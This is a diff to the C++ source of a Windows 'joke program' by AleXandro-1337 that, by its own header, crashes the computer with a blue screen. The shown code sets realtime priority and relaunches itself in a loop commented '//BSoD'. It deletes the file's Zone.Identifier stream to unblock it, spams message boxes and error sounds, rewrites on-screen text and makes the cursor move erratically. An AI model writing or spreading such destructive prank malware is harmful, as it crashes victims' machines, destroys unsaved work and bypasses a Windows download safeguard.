@@ -1,32 +1,34 @@
 /*
-    JokeProgram.Win32_x64.lol
-    Joke program that BSoDs your computer. Save your work first!
-    Copyright (C) 2023 AleXandro-1337
+	JokeProgram.Win32_x64.lol
+	Joke program that BSoDs your computer. Save your work first!
+	Copyright (C) 2023 AleXandro-1337
 
-    This program is free software: you can redistribute it and/or modify
-    it under the terms of the GNU General Public License as published by
-    the Free Software Foundation, either version 3 of the License, or
-    (at your option) any later version.
+	This program is free software: you can redistribute it and/or modify
+	it under the terms of the GNU General Public License as published by
+	the Free Software Foundation, either version 3 of the License, or
+	(at your option) any later version.
 
-    This program is distributed in the hope that it will be useful,
-    but WITHOUT ANY WARRANTY; without even the implied warranty of
-    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
-    GNU General Public License for more details.
+	This program is distributed in the hope that it will be useful,
+	but WITHOUT ANY WARRANTY; without even the implied warranty of
+	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
+	GNU General Public License for more details.
 
-    You should have received a copy of the GNU General Public License
-    along with this program. If not, see <https://www.gnu.org/licenses/>.
-    
-    ***
-    
-    THE CREATOR OF THIS PROGRAM (AleXandro-1337) IS NOT RESPONIBLE FOR DAMAGES
-    THAT THIS PROGRAM MAY CAUSE! EVEN IF THIS IS NOT MEANT TO BE DANGEROUS, IT
-    MAY SITLL CAUSE DAMAGES. USE IT AT YOUR OWN RISK!
+	You should have received a copy of the GNU General Public License
+	along with this program. If not, see <https://www.gnu.org/licenses/>.
+
+	***
+
+	THE CREATOR OF THIS PROGRAM (AleXandro-1337) IS NOT RESPONIBLE FOR DAMAGES
+	THAT THIS PROGRAM MAY CAUSE! EVEN IF THIS IS NOT MEANT TO BE DANGEROUS, IT
+	MAY SITLL CAUSE DAMAGES. USE IT AT YOUR OWN RISK!
 */
 
 typedef struct IUnknown IUnknown;
 
 #include <windows.h>
 #include <tlhelp32.h>
+
+using namespace std;
 
 #pragma comment(lib, "winmm")
 
@@ -98,7 +100,7 @@ LRESULT __stdcall LolBtn(int nCode, WPARAM wParam, LPARAM lParam)
 			default:
 				break;
 			}
-			
+
 			SetWindowTextA(btn, LOL); //Change every message box button text to "lol"
 		}
 	}
@@ -255,7 +257,7 @@ void MessUp()
 	char* exePath = (char*)LocalAlloc(LMEM_ZEROINIT, 8192);
 	GetModuleFileNameA(0, exePath, 8192);
 
-	Sleep(5000);
+	Sleep(10000);
 
 	STARTUPINFOA si;
 	PROCESS_INFORMATION pi;
@@ -265,18 +267,18 @@ void MessUp()
 	RtlZeroMemory(&pi, sizeof(pi));
 
 	for (int i = 0; i < 10; i++)
-		CreateProcessA(0, StrCat(exePath, (LPSTR)" lol"), 0, 0, 0, 0, 0, 0, &si, &pi);
+		CreateProcessA(0, StrCat(exePath, (LPSTR)" lol"), 0, 0, 0, 0, 0, 0, &si, &pi); //BSoD
 }
 
 int __stdcall WinMain(HINSTANCE hI, HINSTANCE, LPSTR, int)
 {
-	SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
+	SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS); //Max priority class
 
 	if (__argc > 1)
 		if (lstrcmpA(__argv[1], "msg") == 0)
 		{
 			CreateThread(0, 0, &SpamMsg, 0, 0, 0); //Spam message boxes
-			Sleep(10000);
+			Sleep(5000);
 			stop = true;
 
 			return 0;
@@ -301,7 +303,7 @@ int __stdcall WinMain(HINSTANCE hI, HINSTANCE, LPSTR, int)
 		{
 			//Message box after reboot
 			HHOOK hook = SetWindowsHookExA(WH_CALLWNDPROCRET, FckBtn, 0, GetCurrentThreadId());
-			MessageBoxA(0, "Don't worry ur pc is safe, dude\nHope u didn't smash ur monitor!\n\nCrafted by AleXandro-1337", LOL, MB_OK | MB_ICONINFORMATION | MB_SYSTEMMODAL);
+			MessageBoxA(0, "Don't worry ur pc is safe, dude\nHope u didn't smash ur monitor!\n\nCrafted by AleXandro-1337\nhttps://www.youtube.com/channel/UCsUr0KZsVZK1bHdDtQMmz6Q", LOL, MB_OK | MB_ICONINFORMATION | MB_SYSTEMMODAL);
 			UnhookWindowsHookEx(hook);
 
 			return 0;
@@ -309,7 +311,7 @@ int __stdcall WinMain(HINSTANCE hI, HINSTANCE, LPSTR, int)
 		else return 0;
 
 	char* exePath = (char*)LocalAlloc(LMEM_ZEROINIT, 16384);
-	GetModuleFileNameA(0, exePath, 8192);
+	GetModuleFileNameA(0, exePath, 8192); //Get executable path
 
 	DeleteFileA(StrCat(exePath, (LPSTR)":Zone.Identifier")); //Unblock executable
 
@@ -330,7 +332,7 @@ int __stdcall WinMain(HINSTANCE hI, HINSTANCE, LPSTR, int)
 	CreateProcessA(0, StrCat(exePath, (LPSTR)" msg"), 0, 0, 0, 0, 0, 0, &si, &pi);
 
 	EnumChildWindows(GetDesktopWindow(), &LolText, 0); //Change all text to "lol"
-	
+
 	CreateThread(0, 0, &SpamSound, 0, 0, 0); //Spam error sounds
 	CreateThread(0, 0, &CursorMess, 0, 0, 0); //Make cursor go nuts
 	Sleep(10000); //Wait a bit
